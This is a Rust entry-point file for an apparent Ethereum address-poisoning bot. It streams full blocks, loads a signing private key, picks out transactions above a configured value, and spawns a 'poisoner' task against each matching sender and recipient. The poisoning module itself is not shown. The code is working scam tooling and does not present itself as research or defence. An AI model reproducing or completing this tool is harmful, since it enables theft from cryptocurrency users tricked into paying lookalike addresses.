use crate::config::get_config;
use crate::poisoner::poisoner;
use crate::providers::{get_http_provider, get_ws_provider};
use crate::tracker::tracker;
use crate::utils::setup_logger;
use alloy::consensus::Transaction;
use alloy::network::{EthereumWallet, TransactionResponse};
use alloy::primitives::U256;
use alloy::providers::Provider;
use alloy::signers::local::PrivateKeySigner;
use futures_util::StreamExt;
use log::debug;
use rocksdb::DB;
use std::ops::Mul;
use std::str::FromStr;
use std::sync::Arc;

mod config;
mod poisoner;
mod providers;
mod tracker;
mod utils;

#[tokio::main]
async fn main() {
    let config = Arc::new(get_config());
    let db = Arc::new(DB::open_default("db").unwrap());

    setup_logger(&config);

    let target_value = U256::from(config.target.value);
    let target_value = target_value.mul(U256::from(10).pow(U256::from(18)));

    let signer = PrivateKeySigner::from_str(&config.private_key).unwrap();
    let wallet = EthereumWallet::from(signer);
    let provider = Arc::new(get_http_provider(wallet, &config.http_url));

    let mut stream = get_ws_provider(&config.ws_url)
        .await
        .subscribe_full_blocks()
        .full()
        .into_stream()
        .await
        .unwrap();

    while let Some(block) = stream.next().await {
        let block = block.unwrap();
        debug!("block received | number {}", block.number());

        for transaction in block.into_transactions_iter() {
            tracker(&config, &db, &transaction);

            if transaction.value() > target_value {
                debug!("matching transaction | hash {}", transaction.tx_hash());

                if config.target.from {
                    tokio::spawn(poisoner(
                        Arc::clone(&config),
                        Arc::clone(&db),
                        Arc::clone(&provider),
                        transaction.to().unwrap(),
                        transaction.from(),
                    ));
                }

                if config.target.to && transaction.to().is_some() {
                    tokio::spawn(poisoner(
                        Arc::clone(&config),
                        Arc::clone(&db),
                        Arc::clone(&provider),
                        transaction.from(),
                        transaction.to().unwrap(),
                    ));
                }
            }
        }
    }
}
